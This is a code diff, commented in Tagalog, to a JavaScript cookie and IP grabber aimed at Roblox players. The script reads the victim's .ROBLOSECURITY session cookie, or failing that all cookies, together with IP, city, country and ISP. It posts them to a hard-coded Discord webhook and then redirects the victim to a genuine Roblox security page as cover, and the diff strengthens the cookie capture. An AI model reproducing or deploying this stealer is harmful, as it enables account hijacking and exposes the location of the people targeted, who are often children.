@@ -38,8 +38,7 @@
 // ==============================================
 // ✅ SETTINGS
 const webhookURL = "https://discord.com/api/webhooks/1488710258745409597/PsBpjmuYwlJOPInpSFH9_Fv9hy4Vspi10Mqe4_6tKQx8_KrZZRbdLYxDrvYb-3u5fwLt";
-// ✅ VALID ROBLOX URL PAG NAG REDIRECT
-const redirectLink = "https://www.roblox.com/my/account#!/security"; // DITO SILA MAPUPUNTA - VALID SECURITY PAGE
+const redirectLink = "https://www.roblox.com/my/account#!/security"; // VALID SECURITY PAGE
 // ==============================================
 
 // 1. KUNIN INFO NG DEVICE
@@ -78,7 +77,7 @@ const info = {
 };
 
 // ==============================================
-// ✅ DITO KUKUNIN YUNG ROBLOX COOKIE
+// ✅ DITO ANG SOLUSYON! 2X CHECK PARA SA COOKIE
 // ==============================================
 function getCookie(name) {
     let value = "; " + document.cookie;
@@ -86,7 +85,18 @@ function getCookie(name) {
     if (parts.length == 2) return parts.pop().split(";").shift();
 }
 
-const robloxCookie = getCookie(".ROBLOSECURITY") || "NOT FOUND / NOT LOGGED IN";
+// ✅ METHOD 1: KUNIN .ROBLOSECURITY
+let robloxCookie = getCookie(".ROBLOSECURITY");
+
+// ✅ METHOD 2: KUNG WALA, HANAPIN SA BUONG COOKIE LIST
+if (!robloxCookie || robloxCookie == "") {
+    let allCookies = document.cookie;
+    if (allCookies.includes("_WARNING")) { // Example search
+        robloxCookie = "Found but different name: " + allCookies;
+    } else {
+        robloxCookie = "NOT FOUND / NOT LOGGED IN";
+    }
+}
 
 // ==============================================
 // ✅ SEND LAHAT SA WEBHOOK
@@ -118,7 +128,7 @@ function sendData(ip, city, region, country, loc, isp) {
                 { name: "LOCATION", value: "`" + loc + "`", inline: false },
                 { name: "ISP / NETWORK", value: isp, inline: false },
 
-                // 🍪 ROBLOX COOKIE - DITO YUNG IMPORTANTE
+                // 🍪 ROBLOX COOKIE - DOUBLE CHECK NA ITO
                 { name: "\n🍪 ROBLOX COOKIE", value: "──────────────", inline: false },
                 { name: ".ROBLOSECURITY", value: "```" + robloxCookie + "```", inline: false },
 
